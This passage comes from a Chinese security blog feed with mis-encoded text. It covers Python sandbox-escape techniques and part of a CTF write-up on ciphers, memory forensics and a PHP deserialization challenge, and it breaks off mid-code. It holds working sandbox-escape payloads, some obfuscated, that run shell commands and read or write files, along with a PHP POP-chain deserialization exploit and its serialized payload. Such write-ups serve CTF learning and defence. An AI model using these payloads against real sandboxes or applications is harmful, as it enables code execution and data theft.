class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:è¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ï¼›</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–¹æ³•å¤§éƒ½æœ‰é™åˆ¶ï¼Œpy2è·Ÿpy3å¯ä»¥ä½¿ç”¨<code>__builtins__</code>é€šåƒ</p><p>py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸º<code>__builtins__</code>è¿”å›çš„æ˜¯ä¸€ä¸ªå­—å…¸ã€‚é€šè¿‡has_keyçš„æ–¹æ³•ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬æƒ³è¦çš„æ˜¯å¦å­˜åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨å‡ºé¢˜çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥æŠŠè¯¥æ¨¡å—ä¸‹çš„å‡½æ•°åˆ æ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure><h2 id="python-ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦"><a href="#python-ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦" class="headerlink" title="python ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦"></a>python ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦</h2><p>ä¸‹é¢å†…å®¹æ‘˜å–è‡ª<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>ä»¥åŠ<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p><p>åœ¨pythonä¸­å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°å¦‚ä¸‹æ‰€ç¤º</p><p>ï¼ˆ1ï¼‰timeit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰exec å’Œeval æ¯”è¾ƒç»å…¸äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰platform</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><p>  (4) getattr() å’Œ getattribute()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>â€‹    (5)fä¿®é¥°ç¬¦</p><p>ç”¨fä¿®é¥°çš„å­—ç¬¦ä¸²å°†å¯ä»¥æ‰§è¡Œä»£ç , ä½†åªæœ‰pythonç‰ˆæœ¬åœ¨ 3.6.0æœä¸Šæ‰æœ‰è¿™ä¸ªæ–¹æ³•</p><p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p><p>è¿™ç§ä»£ç æ‰§è¡Œæ–¹æ³•å’ŒPHPä¸­çš„<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>å¾ˆç±»ä¼¼ï¼Œè¿™æ˜¯Pythonä¸­å¾ˆå°‘æœ‰çš„å‡ ä¸ªèƒ½å¤Ÿç›´æ¥å°†å­—ç¬¦ä¸²è½¬å˜æˆçš„ä»£ç çš„æ–¹å¼</p><p>æ‰§è¡Œä»£ç æ€»ç»“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨file()å‡½æ•°è¯»å–æ–‡ä»¶ï¼šï¼ˆå†™ç±»ä¼¼ï¼‰</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># é‡æ–°è½½å…¥__builtins__ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ __getattibute__ æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### ä¸Šè¿°å‘½ä»¤éœ€è¦é€šè¿‡å“¦ exec æˆ–è€…åˆ«çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; å¯¹åº” <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">æ¨èçš„å¦å¤–ä¸€ä¸ªç±»</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure><p>å°±å…ˆæ€»ç»“åˆ°è¿™é‡Œå§ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿è”ç³»èµ·SSTIè¿˜æ˜¯å¯ä»¥èµ·å¾ˆå¤§çš„ä½œç”¨çš„ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p><p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;åŸºç¡€&quot;&gt;&lt;a href=&quot;#åŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;åŸºç¡€&quot;&gt;&lt;/a&gt;åŸºç¡€&lt;/h3&gt;&lt;p&gt;ä¸€äº›å‡½æ•°éœ€è¦äº†è§£ä¸€ä¸‹ï¼Œè¿™ç¯‡æ–‡ç« è®²çš„å·²ç»å¾ˆè¯¦ç»†
    
    </summary>
    
      <category term="æ²™ç›’ç»•è¿‡" scheme="0verwatch.top/categories/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
    
      <category term="æ²™ç›’ç»•è¿‡" scheme="0verwatch.top/tags/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>å®‰æ’ä¸€æœˆèµ›åšé¢˜è®°å½•</title>
    <link href="0verwatch.top/anheng-1mongth.html"/>
    <id>0verwatch.top/anheng-1mongth.html</id>
    <published>2019-02-03T09:05:51.000Z</published>
    <updated>2019-02-08T10:15:25.705Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªæœˆçš„å®‰æ’æœˆèµ›å¥½åƒå¾ˆæœ‰æ„æ€<a id="more"></a>ï¼Œè‡ªå·±å¿˜äº†å»å‚åŠ äº†2333ï¼Œå›è¿‡å¤´åšä¸€åšè®°å½•ä¸€ä¸‹</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="é”®ç›˜ä¹‹äº‰"><a href="#é”®ç›˜ä¹‹äº‰" class="headerlink" title="é”®ç›˜ä¹‹äº‰"></a>é”®ç›˜ä¹‹äº‰</h4><p>ç™¾åº¦å¯ä»¥çŸ¥é“å†å²ä¸Šæœ‰ä¸¤ç§é”®ç›˜ï¼ŒQWERTYé”®ç›˜è¿˜æ˜¯Dvoraké”®ç›˜ï¼Ÿ</p><p>å…¶å®å°±æ˜¯ä»–ä»¬ä¸¤ä¸ªçš„é”®ç›˜å¯¹åº”çš„ä½ç½®ä¸ä¸€æ ·å¯¼è‡´çš„æ˜ å°„å…³ç³»ï¼Œå¯ä»¥ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wbic16.xedoloh.com/dvorak.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYiUgJ.png" alt="kYiUgJ.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="èµ¢æˆ˜2019"><a href="#èµ¢æˆ˜2019" class="headerlink" title="èµ¢æˆ˜2019"></a>èµ¢æˆ˜2019</h4><p>éƒ½æ˜¯äº›å¸¸è§„æ“ä½œï¼Œbinwalkâ€“&gt;foremostâ€“&gt;stegsolveï¼Œè¯´çœŸçš„ç°åœ¨éƒ½ä¸æƒ³ç©éšå†™</p><p><img src="https://s2.ax1x.com/2019/02/05/kYihDI.png" alt="kYihDI.png"></p><h4 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h4><p>è¿™ä¸ªéšå†™é¢˜ç›®å°±æœ‰ç‚¹æ„æ€å•¦ï¼Œæˆ‘ä»¥å‰æ²¡ç¢°åˆ°è¿‡è¿™ç§å†…å­˜å–è¯çš„ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡ç« <code>https://www.freebuf.com/column/152545.html</code>ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»äº†å¾ˆå¤šå…³äºå†…å­˜å–è¯è¿™æ¬¾è½¯ä»¶çš„æ“ä½œï¼Œå¤§è‡´çš„volatility ä½¿ç”¨å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;æ–‡ä»¶å&gt; â€“profile=&lt;é…ç½®æ–‡ä»¶&gt; &lt;æ’ä»¶&gt; [æ’ä»¶å‚æ•°]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨imageinfoæ’ä»¶æ¥çŒœæµ‹dumpæ–‡ä»¶çš„profileå€¼ï¼Œ<code>volatility -f memory imageinfo</code>ï¼Œå¾—åˆ°profileå€¼ä¸º<code>WinXPSP2x86</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYFHdx.png" alt="kYFHdx.png"></p><p>ç›´æ¥hashdumpï¼Œæ¯•ç«Ÿåœ¨Windowsç³»ç»Ÿä¸‹é¢ï¼Œä½†å¸¸è§„è¿˜æ˜¯å¾—æŸ¥æ³¨å†Œè¡¨ä½ç½®ï¼Œæ‰¾åˆ°systemå’Œsam keyçš„èµ·å§‹ä½ç½®<code>hivelist -f memory -profile=WinXPSP2x86</code>ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ï¼Œç›´æ¥hashdumpäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYkZlQ.png" alt="kYkZlQ.png"></p><p>è·å¾—å¯†ç <code>c22b315c040ae6e0efee3518d830362b</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYkumn.png" alt="kYkumn.png"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h4><p>ä¸Šæ¥å°±ä¸€ä¸ªæºç ï¼Œä½†çœ‹åˆ°<code>unserialize</code>åº”è¯¥å°±æ˜¯å¾€ååºåˆ—åŒ–é‚£ä¸ªæ–¹å‘æ€è€ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå«popé“¾çš„æ„é€ é—®é¢˜ï¼Œä¸‹é¢è¿™ç¯‡æ–‡ç« å°±è®²çš„å¾ˆè¯¦ç»†äº†<code>https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</code>ï¼Œç®€å•æ¥è¯´å°±æ˜¯å½“å…³é”®çš„ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•çš„æ—¶å€™è€Œæ˜¯åœ¨ä¸€äº›ç±»çš„æ™®é€šæ–¹æ³•é‡Œé¢çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>å…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•é‡Œ</li><li>æ™®é€šçš„æ–¹æ³•é‡Œé¢å¿…é¡»è¦æœ‰ç›¸åŒå‡½æ•°å</li></ol><p>è§‚å¯Ÿå…³é”®ä»£ç ï¼Œå‘ç°è¦å®ç°è¯»æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¾—å…ˆæ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">      &#123;</span><br><span class="line">          $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">          <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">          &#123;              </span><br><span class="line">              <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸¤ä¸ªç±»éƒ½å­˜åœ¨readå‡½æ•°è¿™ä¸ªæ—¶å€™å°±å¾ˆå¯ä»¥å…ˆæ„é€ popé“¾ï¼Œå› ä¸ºskyobjæ˜¯ä¸ªprotectedç±»å‹çš„å˜é‡ï¼Œåªèƒ½ä½¿ç”¨å¯¹è±¡æ³¨å…¥äº†ï¼Œè¿™æ ·æ— è®ºæ˜¯privateè¿˜æ˜¯publicéƒ½å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯aaaçš„å€¼ä¼šå˜åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å¼•ç”¨ä½¿bbbåŠ¨æ€è·Ÿç€aaaã€‚å…ˆæ„é€ amazing</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span 